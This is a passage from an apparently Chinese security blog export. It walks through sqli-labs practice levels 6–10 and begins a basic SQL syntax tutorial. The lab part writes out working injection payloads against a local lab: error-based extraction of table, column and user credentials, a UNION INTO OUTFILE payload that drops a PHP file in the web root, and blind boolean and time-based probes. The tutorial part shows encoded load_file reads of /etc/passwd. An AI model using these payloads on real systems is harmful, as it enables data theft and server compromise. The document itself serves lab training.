class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>bachang<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-6</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot; and extractvalue(1,concat(&#x27;~&#x27;, (select table_name from information_schema.tables where table_schema=database() limit 0,1)))--+<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230301171056216.png" alt="image-20230301171056216"></p><h3 id="爆字段名"><a href="#爆字段名" class="headerlink" title="爆字段名"></a>爆字段名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>bachang<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-6</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot; and extractvalue(1,concat(&#x27;~&#x27;, (select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1)))--+<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230301171254417.png" alt="image-20230301171254417"></p><h3 id="报数据信息"><a href="#报数据信息" class="headerlink" title="报数据信息"></a>报数据信息</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>bachang<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-6</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot; and extractvalue(1,concat(&#x27;~&#x27;, (select concat_ws(&#x27;;&#x27;,id,username,password) from security.users limit 1,1)))--+<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230301171623933.png" alt="image-20230301171623933"></p><h2 id="less-7-基于文件写入注入"><a href="#less-7-基于文件写入注入" class="headerlink" title="less-7 基于文件写入注入"></a>less-7 基于文件写入注入</h2><h3 id="判断注入点和闭合方式"><a href="#判断注入点和闭合方式" class="headerlink" title="判断注入点和闭合方式"></a>判断注入点和闭合方式</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;--+ //错误</span><br><span class="hljs-string">//通过一系列的尝试发现，正确的闭合方式</span><br><span class="hljs-string">?id=1&#x27;</span>))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="-1"><a href="#-1" class="headerlink" title></a><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230301220946894.png" alt="image-20230301220946894"></h3><p>显示use outfile，这里可以理解为写入文件</p><p>源码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br># 使用单引号加双层括号拼接<br>$<span class="hljs-keyword">sql</span><span class="hljs-operator">=</span>&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;<br><br># 支持布尔盲注、延时盲注<br>if <span class="hljs-literal">true</span>:<br>    输出 You <span class="hljs-keyword">are</span> in.... Use outfile......<br><span class="hljs-keyword">else</span>:<br>    输出 You have an error <span class="hljs-keyword">in</span> your <span class="hljs-keyword">SQL</span> syntax<br>  <span class="hljs-operator">/</span><span class="hljs-operator">/</span>print_r(mysql_error());<br></code></pre></td></tr></table></figure><p>可以看到闭合方式，以及回显的条件，可以看住报错注入已经不能使用了，报错返回语句被注释掉了，可以使用延时注入和布尔盲注</p><p>根据作者的提示，可以发现他的目的是让我们导入文件，所以跟着作者的思路我们来学习一下，如何写入数据</p><p>使用 outfile 导出到文件来查询数据，默认 outfile 是没有开启的，得手动开启一下</p><h3 id="打开mysql的读写权限"><a href="#打开mysql的读写权限" class="headerlink" title="打开mysql的读写权限"></a>打开mysql的读写权限</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span>   #查看是否打开文件写入开关<br></code></pre></td></tr></table></figure><ul><li>secure_file_priv的值为null ，表示限制mysqld不允许导入|导出</li><li>secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld的导入|导出只能发生在&#x2F;tmp&#x2F;目录下</li><li>secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制</li></ul><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230301222059473.png" alt="image-20230301222059473"></p><p>显然我们需要更改配置，在my.ini中，如何查根目录，可以在第一关使用@@datadir命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>bachang<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-1</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,@@datadir,3--+</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230301222414291.png" alt="image-20230301222414291"></p><p>在题目目录下写入文件  </p><p>D:\phpStudy\PHPTutorial\WWW\bachang\sqli-labs\Less-7</p><h3 id="查看是否已经有了读写权限"><a href="#查看是否已经有了读写权限" class="headerlink" title="查看是否已经有了读写权限"></a>查看是否已经有了读写权限</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;))and (select count(*) from mysql.user)&gt;0 --+</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230301223723726.png" alt="image-20230301223723726"></p><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>bachang<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-7</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-operator">%</span><span class="hljs-number">27</span>))<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-operator">%</span><span class="hljs-number">22</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>C?php<span class="hljs-operator">%</span><span class="hljs-number">20</span>phpinfo();?<span class="hljs-operator">%</span><span class="hljs-number">3</span>E<span class="hljs-operator">%</span><span class="hljs-number">22</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">into</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>outfile<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">22</span>D:\\phpStudy\\PHPTutorial\\WWW\\bachang\\sqli<span class="hljs-operator">-</span>labs\\Less<span class="hljs-number">-7</span>\\<span class="hljs-number">2.</span>php<span class="hljs-operator">%</span><span class="hljs-number">22</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230301224739524.png" alt="image-20230301224739524"></p><h2 id="less-8-基于单引号布尔盲注"><a href="#less-8-基于单引号布尔盲注" class="headerlink" title="less-8 :基于单引号布尔盲注"></a>less-8 :基于单引号布尔盲注</h2><h3 id="注入点判断-3"><a href="#注入点判断-3" class="headerlink" title="注入点判断"></a>注入点判断</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=2 --+</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230301225126220.png" alt="image-20230301225126220"></p><h3 id="判断数据库，表和数据信息等"><a href="#判断数据库，表和数据信息等" class="headerlink" title="判断数据库，表和数据信息等"></a>判断数据库，表和数据信息等</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>bachang<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-8</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(database())&gt;7--+</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230301225322269.png" alt="image-20230301225322269"></p><h2 id="less-9-基于单引号延时注入"><a href="#less-9-基于单引号延时注入" class="headerlink" title="less-9: 基于单引号延时注入"></a>less-9: 基于单引号延时注入</h2><p>经过对注入点闭合方式的测试，发现无论是单引号还是双引号等不同的闭合方式全部返回you are in……</p><p>由此可见不能够使用布尔盲注了，使用时间盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and sleep(5) --+</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if (length(database())=7 ,sleep(5),1)--+无延时</span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">and</span> if (length(database())<span class="hljs-operator">=</span><span class="hljs-number">8</span> ,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+延时五秒</span><br></code></pre></td></tr></table></figure><p>经过复杂的手工注入就可以拿到想要的东西</p><h2 id="less-10-基于双引号的时间盲注"><a href="#less-10-基于双引号的时间盲注" class="headerlink" title="less-10:基于双引号的时间盲注"></a>less-10:基于双引号的时间盲注</h2><p>和第九关相同，只是闭合方式是双引号闭合</p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>sql注入</tag>
      
      <tag>GET</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql基础语法</title>
    <link href="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/"/>
    <url>/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/</url>
    
    <content type="html"><![CDATA[<h2 id="基础语句"><a href="#基础语句" class="headerlink" title="基础语句"></a>基础语句</h2><h3 id="select语句"><a href="#select语句" class="headerlink" title="select语句"></a>select语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users; # 读取users表的信息,<span class="hljs-operator">*</span>通配符<br><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users; # 查询指定字段的信息<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span>; # <span class="hljs-keyword">where</span>语句，指定查询位置<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">&lt;</span> <span class="hljs-number">4</span>; <br></code></pre></td></tr></table></figure><p>sql中有很多的比较符，如 &#x3D;，&gt; 、&lt; 、&#x3D;、&gt;&#x3D;、&lt;&#x3D; 、like、between、in 等</p><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228113036555.png" alt="image-20230228113036555"></p><h3 id="and-amp-or-对数据进行过滤"><a href="#and-amp-or-对数据进行过滤" class="headerlink" title="and &amp; or 对数据进行过滤"></a>and &amp; or 对数据进行过滤</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id<span class="hljs-operator">&lt;</span><span class="hljs-number">4</span> <span class="hljs-keyword">and</span> id <span class="hljs-operator">&gt;</span><span class="hljs-number">1</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> id <span class="hljs-operator">=</span><span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228113736000.png" alt="image-20230228113736000"></p><h3 id="order-by-排序"><a href="#order-by-排序" class="headerlink" title="order by 排序"></a>order by 排序</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> username; # 默认升序<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> username <span class="hljs-keyword">DESC</span>; # 降序<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228114106194.png" alt="image-20230228114106194"></p><h3 id="insert-into—向表中插入记录"><a href="#insert-into—向表中插入记录" class="headerlink" title="insert  into—向表中插入记录"></a>insert  into—向表中插入记录</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> student <span class="hljs-keyword">values</span>(<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;eee&#x27;</span>,<span class="hljs-string">&#x27;fff&#x27;</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,password) <span class="hljs-keyword">values</span> (<span class="hljs-number">6</span>,&quot;eee&quot;,&quot;fff&quot;);<br></code></pre></td></tr></table></figure><h3 id="update更新表中的数据"><a href="#update更新表中的数据" class="headerlink" title="update更新表中的数据"></a>update更新表中的数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> student <span class="hljs-keyword">set</span> username<span class="hljs-operator">=</span>&quot;root&quot;,password<span class="hljs-operator">=</span>&quot;root1&quot; <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">6</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228115131492.png" alt="image-20230228115131492"></p><h3 id="alter-table-更新表"><a href="#alter-table-更新表" class="headerlink" title="alter table 更新表"></a>alter table 更新表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> <span class="hljs-operator">&lt;</span>列名<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>数据类型<span class="hljs-operator">&gt;</span>;     <span class="hljs-operator">/</span><span class="hljs-operator">/</span>增加新列<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">drop</span> <span class="hljs-keyword">column</span> <span class="hljs-operator">&lt;</span>列名<span class="hljs-operator">&gt;</span>;               <span class="hljs-operator">/</span><span class="hljs-operator">/</span>删除列<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">&lt;</span>旧表名<span class="hljs-operator">&gt;</span> rename <span class="hljs-keyword">to</span> <span class="hljs-operator">&lt;</span>新表名<span class="hljs-operator">&gt;</span>;   # 重命名表<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228154309683.png" alt="image-20230228154309683"></p><h3 id="like-在where子句中搜索列中的指定模式"><a href="#like-在where子句中搜索列中的指定模式" class="headerlink" title="like 在where子句中搜索列中的指定模式"></a>like 在where子句中搜索列中的指定模式</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> &quot;ad%&quot;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228115351727.png" alt="image-20230228115351727"></p><h3 id="union-合并两个或多个select语句的结果"><a href="#union-合并两个或多个select语句的结果" class="headerlink" title="union 合并两个或多个select语句的结果"></a>union 合并两个或多个select语句的结果</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> student <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> stu_id <span class="hljs-keyword">from</span> student;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228115707119.png" alt="image-20230228115707119"></p><h3 id="别名-as"><a href="#别名-as" class="headerlink" title="别名(as)"></a>别名(as)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">&lt;</span>列名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">as</span> <span class="hljs-operator">&lt;</span>别名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">from</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span>;<br></code></pre></td></tr></table></figure><h3 id="create-table创建表"><a href="#create-table创建表" class="headerlink" title="create table创建表"></a>create table创建表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span>(<br><span class="hljs-operator">&lt;</span>列名<span class="hljs-number">1</span><span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>数据类型<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>约束条件<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">&lt;</span>列名<span class="hljs-number">2</span><span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>数据类型<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>约束条件<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">&lt;</span>列名<span class="hljs-number">3</span><span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>数据类型<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>约束条件<span class="hljs-operator">&gt;</span><br>...<br>);<br></code></pre></td></tr></table></figure><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="user"><a href="#user" class="headerlink" title="user()"></a>user()</h3><ul><li>查看当前数据库用户</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228120102644.png" alt="image-20230228120102644"></p><h3 id="database"><a href="#database" class="headerlink" title="database()"></a>database()</h3><ul><li>查看当前数据库的名字</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228125958355.png" alt="image-20230228125958355"></p><h3 id="version"><a href="#version" class="headerlink" title="version()"></a>version()</h3><ul><li>查看当前数据库的版本信息</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228130050495.png" alt="image-20230228130050495"></p><h3 id="hostname"><a href="#hostname" class="headerlink" title="@@hostname"></a>@@hostname</h3><ul><li>查看当前计算机的用户名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@hostname</span>;<br></code></pre></td></tr></table></figure><h3 id="datadir"><a href="#datadir" class="headerlink" title="@@datadir"></a>@@datadir</h3><ul><li>查看mysql的data目录的绝对路径</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228130335710.png" alt="image-20230228130335710"></p><h3 id="version-compile-os"><a href="#version-compile-os" class="headerlink" title="@@version_compile_os"></a>@@version_compile_os</h3><ul><li>查看操作系统位数</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228130518306.png" alt="image-20230228130518306"></p><h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h3><ul><li>读取文件</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>),<span class="hljs-number">3</span>#<br># 编码<br><span class="hljs-number">1</span><span class="hljs-operator">-</span>十六进制编码<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(<span class="hljs-number">0x2f6574632f706173737764</span>),<span class="hljs-number">3</span>#  <br><span class="hljs-number">0x2f6574632f706173737764</span><span class="hljs-comment">---&gt;/etc/passwd</span><br><span class="hljs-number">2</span><span class="hljs-operator">-</span><span class="hljs-type">CHAR</span><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(<span class="hljs-type">CHAR</span>(<span class="hljs-number">47</span>,<span class="hljs-number">101</span>,<span class="hljs-number">116</span>,<span class="hljs-number">99</span>,<span class="hljs-number">47</span>,<span class="hljs-number">112</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">119</span>,<span class="hljs-number">100</span>)),<span class="hljs-number">3</span>#<br><br></code></pre></td></tr></table></figure><h3 id="like"><a href="#like" class="headerlink" title="like"></a>like</h3><ul><li>类似于等号，可以使用通配符</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a&#x27;</span>;  # 查询username是a的字段<br># 带有<span class="hljs-operator">%</span>通配符<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>  #  查询username中开头是a的字段<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%a%&#x27;</span>　# 查询username中含有a的字段<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%a&#x27;</span>  # 查询username中结尾是a的字段<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228131858089.png" alt="image-20230228131858089"></p><h3 id="regexp"><a href="#regexp" class="headerlink" title="regexp()"></a>regexp()</h3><ul><li>只要有就能匹配，like是等于才匹配</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username regexp(<span class="hljs-string">&#x27;ad&#x27;</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username regexp <span class="hljs-string">&#x27;ad&#x27;</span>;<br><br></code></pre></td></tr></table></figure><h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h3><ul><li>sleep(x)—-暂停x秒后执行</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>);<br># 这样写前面查询结果为空<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228132539314.png" alt="image-20230228132539314"></p><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><ul><li>if(条件,1,0) 如果条件成立，那么返回1，反之返回0，这里的返回值是可以任意修改的，也可以写表达式</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 